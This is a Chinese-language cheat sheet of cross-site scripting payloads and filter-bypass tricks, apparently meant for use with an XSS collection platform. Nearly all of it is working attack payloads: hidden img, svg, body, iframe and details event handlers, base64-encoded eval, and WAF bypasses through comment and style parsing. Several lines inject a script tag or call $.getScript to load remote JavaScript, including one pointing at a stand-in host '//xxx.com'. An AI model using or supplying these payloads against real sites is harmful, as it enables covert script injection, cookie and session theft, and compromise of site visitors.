# x55-bypass

---

### 规则

```
1.x55平台做了http重定向https，//无论解析成http和https都可以使用；x55平台地址“？”后面可以不要
2.标签与第一个属性之间可以用“/”代替空格
3.引号内容可以转10进制或者16进制
4.style=display:none  #设置成无显示，PS：有些标签不一定支持
5.域名可以换成真实IP、url编码、双字节编码、16进制、8进制
6.网站有jq可以使用$.getScript("js地址")
7.如果//alert不行可以试试//prompt
```

### 常用

- 变形
  ```
  #//alert 或者prompt -> 网站有jq可以使用: $.getScript("js地址")
                         -> createElement('script');body.appendChild(s);s.src='js地址'>
                         -> eval(atob('YWxlcnQoJzEyMycp')) #base64接码：alert('123')
  ```
-  无script标签

  ```
  ##// <BODY/ONLOAD=alert(1)>   
  ##// <SVG/ONLOAD=alert(1) style=display:none>
  ##// <audio src=x onerror=alert("xss");>
  ##// <video style=display:none><source onerror="alert(1)">
  ```

- img（不显示图片）

  ```
  ##// <img/style=display:none src=# onerror=eval(atob('YWxlcnQoJzEyMycp'))>
  注：YWxlcnQoJzEyMycp => 弹窗123
  ##// <img/src=# style=display:none onerror=$.getScript("js地址")>
  ##// <img/src=# style=display:none onerror=createElement('script');body.appendChild(s);s.src='js地址'>
  
  ```

- iframe data:text/html  # 目前只能测试能在iframe上使用

  ```
  ##// <iframe/style="display:none" src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E">##</iframe>
注：%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E为url编码 -> ## 弹窗1
  ```

- details 详细标签 #可能会把后面的数据隐藏

  ```
  ##// <details/open/ontoggle=alert(1) style=display:none>
  ```



### 绕过规则

```
https://www.freebuf.com/articles/web/153055.html
https://www.cnblogs.com/wjrblogs/p/12341190.html
```

###  bypass 常规waf(x=alert(1))

```
冷门标签绕过：

##// `!-- --`绕过:
##// `<!--<img src="--><img src onerror=x//">`

##// `<style><img src="</style><img src onerror=x//">`
```

### 绕过<script src>的正则

```
##// <SCRIPT a=">" SRC="//xxx.com/xxxx"></SCRIPT>   
```

### 当fuzz出可以执行js代码的标签后，执行在当前页面添加script标签语句

```
##// <img src=# onerror=s=createElement('script');body.appendChild(s);s.src='js地址';>
```



